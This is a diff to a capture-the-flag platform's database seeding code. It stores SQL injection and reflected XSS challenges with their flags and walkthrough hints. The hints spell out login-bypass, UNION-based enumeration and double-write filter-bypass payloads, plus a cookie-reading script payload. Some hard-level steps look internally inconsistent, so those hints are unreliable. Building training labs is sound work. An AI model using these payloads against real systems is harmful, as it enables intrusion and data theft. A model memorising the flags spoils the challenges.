@@ -157,13 +157,13 @@ def init_db():
         if vuln_count == 0:
             vulnerabilities_data = [
                 ('SQL注入-入门', 'SQL注入-入门', 'Mlai{sqli_easy_2026_get_flag}', 
-                 '1. 这是一个简单的数字型SQL注入，无任何过滤\n2. 输入1\'测试，会发现SQL语法错误\n3. 使用UNION SELECT查询获取数据：1\' UNION SELECT 1,2,3,4,5,6,7,8,9,10--\n4. 查询flag表获取flag：1\' UNION SELECT 1,2,3,4,5,6,7,8,9,flag FROM flag--',
-                 '简单的数字型SQL注入漏洞，无任何过滤措施', 'easy', 'sqli', 'sqli-easy', 'docker/sqli-easy/docker-compose.yml'),
+                 '解题思路：\n1. 在登录框输入用户名：admin\' #，密码任意\n2. 使用 ORDER BY 判断列数：1\' ORDER BY 3 #\n3. 使用 UNION SELECT 探测注入点：-1\' UNION SELECT 1,2,3 #\n4. 获取数据库名：-1\' UNION SELECT 1, database(),3 #\n5. 获取表名：-1\' UNION SELECT 1, GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=\'sqli_db\' #\n6. 获取flag表列名：-1\' UNION SELECT 1, GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name=\'flag\' #\n7. 获取flag：-1\' UNION SELECT id, flag,3 FROM flag#\n\n说明：这是一个简单的SQL注入漏洞，登录验证处存在字符型注入，使用 # 注释掉后续SQL语句绕过验证',
+                 '简单的SQL注入漏洞，登录验证存在字符型注入', 'easy', 'sqli', 'sqli-easy', 'docker/sqli-easy/docker-compose.yml'),
                 ('SQL注入-中级', 'SQL注入-中级', 'Mlai{sqli_medium_bypass_comment}',
-                 '1. 这是一个字符型SQL注入，注释符被过滤\n2. 输入1\'测试，发现报错\n3. 由于注释符被过滤，需要闭合引号来绕过\n4. 可以使用payload：1\' union select 1,2,3,4,5,6,7,8,9,10 or \'1\'=\'1\n5. 查询flag：1\' union select 1,2,3,4,5,6,7,8,9,flag from flag or \'1\'=\'1',
+                 '解题思路：\n1. 在登录框输入用户名：admin\' or \'1\'=\'1，密码任意\n2. 使用 ORDER BY 判断列数：1\' ORDER BY 3 or \'1\'=\'1\n3. 使用 UNION SELECT 探测注入点：-1\' UNION SELECT 1,2,3 or \'1\'=\'1\n4. 获取数据库名：-1\' UNION SELECT 1, database(),3 or \'1\'=\'1\n5. 获取表名：-1\' UNION SELECT 1, GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=\'sqli_db\' or \'1\'=\'1\n6. 获取flag表列名：-1\' UNION SELECT 1, GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name=\'flag\' or \'1\'=\'1\n7. 获取flag：-1\' UNION SELECT id, flag,3 FROM flag or \'1\'=\'1\n\n说明：此题目过滤了注释符(# 和 --)，需要使用 or \'1\'=\'1 来闭合原语句，使后面的条件永远为真',
                  '字符型SQL注入，过滤了注释符', 'medium', 'sqli', 'sqli-medium', 'docker/sqli-medium/docker-compose.yml'),
                 ('SQL注入-高级', 'SQL注入-高级', 'Mlai{sqli_hard_double_write_bypass}',
-                 '1. 这是一个严格的SQL注入，过滤了多个关键字\n2. 常见的关键字如select、union等被过滤\n3. 可以使用双写绕过：selselectect、ununionion\n4. 双写绕过示例：1\' ununionion selselectect 1,2,3,4,5,6,7,8,9,10--\n5. 查询flag：1\' ununionion selselectect 1,2,3,4,5,6,7,8,9,flag frfromom flag--',
+                 '解题思路：\n1. 在登录框输入：admin\' oorr \'1\'=\'1（oorr是or的双写）\n2. 使用 ORDER BY 判断列数：1\' oorrder by 3 or \'1\'=\'1\n3. 使用 UNION SELECT 探测注入点：-1\' uniunionon select 1,2,3 or \'1\'=\'1\n4. 获取数据库名：-1\' uniunionon select 1,datadatabase(),3 or \'1\'=\'1\n5. 获取表名：-1\' uniunionon select 1,GROUPCONCAT(table_name),3 from information_schema.tables where table_schema=\'sqli_db\' or \'1\'=\'1\n6. 获取flag表列名：-1\' uniunionon select 1,GROUPCONCAT(column_name),3 from information_schema.columns where table_name=\'flag\' or \'1\'=\'1\n7. 获取flag：-1\' uniunionon select id,flag,3 from flag or \'1\'=\'1\n\n说明：此题目过滤了多个关键字（select、union、or、order、by、where等），需要使用双写绕过。例如：or→oorr，union→uniunionon，select→selselectect，database→datadatabase',
                  '高级SQL注入，过滤多个关键字，需要双写绕过', 'hard', 'sqli', 'sqli-hard', 'docker/sqli-hard/docker-compose.yml'),
                 ('反射型XSS', '反射型XSS', 'Mlai{xss_reflected_flag}',
                  '1. 这是一个简单的反射型XSS漏洞\n2. URL参数直接输出到页面中，没有过滤\n3. 测试：输入 <script>alert(1)</script>\n4. 尝试获取cookie：<script>alert(document.cookie)</script>',
